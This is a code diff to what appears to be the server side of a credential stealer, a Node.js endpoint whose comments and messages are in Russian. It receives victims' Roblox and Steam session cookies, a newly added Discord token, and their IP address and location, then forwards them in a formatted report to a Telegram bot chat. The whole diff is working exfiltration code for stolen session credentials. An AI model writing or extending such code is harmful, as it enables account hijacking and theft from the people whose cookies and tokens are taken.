@@ -12,43 +12,33 @@ const API = "https://api.telegram.org/bot" + TOKEN;
 
 app.post('/send', async (req, res) => {
     try {
-        const { robloxCookie, steamCookie, ip, country, city } = req.body;
+        const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;
 
-        let msg = "👋 ЗАПУЩЕН\n\n";
-        if (ip) {
-            msg += "IP: " + ip + "\n";
-            msg += "Страна: " + (country || "Н/Д") + "\n";
-            msg += "Город: " + (city || "Н/Д");
-        }
+        let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
+        msg += "━━━━━━━━━━━━━━━━━━\n\n";
+        msg += "🌐 <b>IP:</b> <code>" + (ip || "Н/Д") + "</code>\n";
+        msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
+        msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
+        msg += "━━━━━━━━━━━━━━━━━━\n\n";
+
+        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
+        msg += robloxCookie ? "<code>" + robloxCookie + "</code>\n\n" : "❌ Не найден\n\n";
+
+        msg += "🎮 <b>STEAM COOKIE:</b>\n";
+        msg += steamCookie ? "<code>" + steamCookie + "</code>\n\n" : "❌ Не найден\n\n";
+
+        msg += "💬 <b>DISCORD TOKEN:</b>\n";
+        msg += discordToken ? "<code>" + discordToken + "</code>\n\n" : "❌ Discord не открыт\n\n";
+
+        msg += "━━━━━━━━━━━━━━━━━━\n";
+        msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
 
         await axios.post(API + "/sendMessage", {
             chat_id: CHAT_ID,
-            text: msg
+            text: msg,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
         });
-
-        if (robloxCookie) {
-            try {
-                await axios.post(API + "/sendDocument", {
-                    chat_id: CHAT_ID,
-                    document: robloxCookie,
-                    caption: "Roblox Cookie"
-                });
-            } catch (e) {
-                console.log('Ошибка роблокс:', e.response?.data || e.message);
-            }
-        }
-
-        if (steamCookie) {
-            try {
-                await axios.post(API + "/sendDocument", {
-                    chat_id: CHAT_ID,
-                    document: steamCookie,
-                    caption: "Steam Cookie"
-                });
-            } catch (e) {
-                console.log('Ошибка стим:', e.response?.data || e.message);
-            }
-        }
 
         res.json({ ok: true });
     } catch (e) {
